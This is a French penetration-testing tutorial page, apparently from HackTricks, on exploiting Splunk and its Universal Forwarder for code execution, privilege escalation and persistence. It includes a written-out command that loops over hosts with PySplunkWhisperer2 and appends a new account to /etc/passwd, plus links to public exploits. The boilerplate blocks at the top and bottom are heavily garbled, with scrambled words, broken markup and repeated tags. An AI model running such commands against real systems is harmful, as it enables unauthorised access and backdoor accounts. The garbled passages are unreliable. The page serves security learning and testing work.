# Splunk LPE et Persistance

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Si vous **énumérez** une machine **en interne** ou **en externe** et que vous trouvez **Splunk en cours d'exécution** (port 8090), si vous avez la chance de connaître des **identifiants valides**, vous pouvez **abuser du service Splunk** pour **exécuter un shell** en tant qu'utilisateur exécutant Splunk. Si root l'exécute, vous pouvez élever vos privilèges à root.

De plus, si vous êtes **déjà root et que le service Splunk n'écoute pas uniquement sur localhost**, vous pouvez **voler** le fichier **de mot de passe** **du** service Splunk et **craquer** les mots de passe, ou **ajouter de nouveaux** identifiants. Et maintenir la persistance sur l'hôte.

Dans la première image ci-dessous, vous pouvez voir à quoi ressemble une page web Splunkd.

## Résumé de l'Exploitation de l'Agent Splunk Universal Forwarder

Pour plus de détails, consultez le post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ceci est juste un résumé :

**Aperçu de l'Exploitation :**
Une exploitation ciblant l'Agent Splunk Universal Forwarder (UF) permet aux attaquants disposant du mot de passe de l'agent d'exécuter du code arbitraire sur les systèmes exécutant l'agent, compromettant potentiellement un réseau entier.

**Points Clés :**
- L'agent UF ne valide pas les connexions entrantes ni l'authenticité du code, le rendant vulnérable à l'exécution non autorisée de code.
- Les méthodes courantes d'acquisition de mots de passe incluent leur localisation dans des répertoires réseau, des partages de fichiers ou de la documentation interne.
- Une exploitation réussie peut conduire à un accès au niveau SYSTEM ou root sur les hôtes compromis, à l'exfiltration de données et à une infiltration réseau supplémentaire.

**Exécution de l'Exploitation :**
1. L'attaquant obtient le mot de passe de l'agent UF.
2. Utilise l'API Splunk pour envoyer des commandes ou des scripts aux agents.
3. Les actions possibles incluent l'extraction de fichiers, la manipulation de comptes utilisateurs et la compromission du système.

**Impact :**
- Compromission complète du réseau avec des permissions au niveau SYSTEM/root sur chaque hôte.
- Potentiel de désactivation de la journalisation pour échapper à la détection.
- Installation de portes dérobées ou de ransomware.

**Commande Exemple pour l'Exploitation :**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits publics utilisables :**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abus des requêtes Splunk

**Pour plus de détails, consultez le post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
